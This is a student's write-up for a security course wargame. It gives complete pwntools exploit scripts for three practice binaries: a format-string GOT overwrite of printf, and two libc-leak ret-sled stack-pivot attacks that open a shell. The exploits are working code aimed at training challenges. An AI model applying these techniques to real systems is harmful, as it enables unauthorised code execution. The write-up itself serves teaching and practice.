# COMP6447 Wargame 8
Written by WENG XINN CHOW (z5346077) on 11.08.2022

crypto3
===========================
General overview of problems faced
-------------------------------------
1. Had to use format strings to exploit. Using format strings can find the offset to user input, which is 12. 
2. Had to overwrite GOT printf function with system address and ```/bin/sh``` address. 
3. Tried using format strings to leak libc address but couldn't seem to work.

Script/Command used
------------------
```
from pwn import *

p = process("./crypto3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)

# Got printf
printf = 0x56559010
system = 0xf7dc0150
libc.address = system - libc.symbols['system']
log.info(f"libc base: {hex(libc.address)}")
binsh = next(libc.search(b'/bin/sh')) # 0xf7f350f5
log.info(f"/bin/sh: {hex(binsh)}")

payload = p32(printf)
payload += p32(printf + 1)
payload += p32(printf + 2)
payload += p32(printf + 3)

# Offset to user input = 12
bytes_write_f5 = 0xf5 - len(payload)
payload += f"%{bytes_write_f5}x%12$n".encode()

bytes_write_50 = 0x150 - 0xf5
payload += f"%{bytes_write_50}x%13$n".encode()

bytes_write_f3 = 0x1f3 - 0x150
payload += f"%{bytes_write_f3}x%14$n".encode()

bytes_write_f7 = 0x1f7 - 0x1f3
payload += f"%{bytes_write_f7}x%15$n".encode()

p.sendline(b'C')
p.sendline(payload)

p.interactive()
```
bsl
===========================
General overview of problems faced
-------------------------------------
1. Had to use the libc leaked to find the system and ```/bin/sh``` addresses.
2. Tried to send the first payload which contains a return sled, system and ```/bin/sh``` addresses.
3. Then, sent the second payload to overwrite the ESP so it would point back to the return sled. 
   
Script/Command used
------------------
```
from pwn import *

p = process("./bsl")
libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)

p.recvlines(3)
p.sendline(b'y')

p.recvlines(2)
p.recvuntil(b': ')
puts_leaked = int(p.recvuntil('\n')[:-1], 16)
log.info(f"puts leaked: {hex(puts_leaked)}")

libc.address = puts_leaked - libc.symbols["puts"]
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")

p.recvline()
p.sendline(b'y')

p.recvline()
p.sendline(b'0')

p.recvlines(2)
ret = 0x000004a6
payload = p32(ret) * 100
payload += p32(system)
payload += b'A' * 4
payload += p32(binsh)
p.sendline(payload)

p.recvline()
p.sendline(b'y')

p.recvlines(2)
p.sendline(b'2')

p.recvline()
payload = b'A' * 204
p.sendline(payload)

p.interactive()
```
piv_it
===========================
General overview of problems faced
-------------------------------------
1. Had to leak libc address and use that leaked address to find the system and ```/bin/sh``` addresses. 
2. Had to find the ret gadget using ```ROPgadget```. 
3. For the first payload, I sent a return sled, the system and ```/bin/sh``` addresses that were previously obtained. 
4. Then, in the second payload, I sent enough A's to overwrite ESP so that it would point back to the address of our first payload on the stack.
Script/Command used
------------------
```
from pwn import *

p = process("./piv_it")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

p.recvlines(12)
p.recvuntil(b': ')
# printf leaked
printf_leaked = int(p.recvuntil(b'\n')[:-1], 16)
log.info(f"printf_leaked: {hex(printf_leaked)}")

libc.address = printf_leaked - libc.symbols["printf"]
log.info(f"libc base: {hex(libc.address)}")
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")

# ret gadget
ret = 0x00000462
offset = 160
first_offset = 128

retsled_len = (first_offset - 12) / 4 - 1 
retsled = p32(ret) * int(retsled_len)

p.recvlines(3) 
payload = retsled
payload += p32(system)
payload += b'A' * 4
payload += p32(binsh)
# Enough A to overwrite
payload += b'A' * 3
p.sendline(payload)

p.recvlines(5)
p.sendline(b'A' * (offset - first_offset))

p.interactive()
```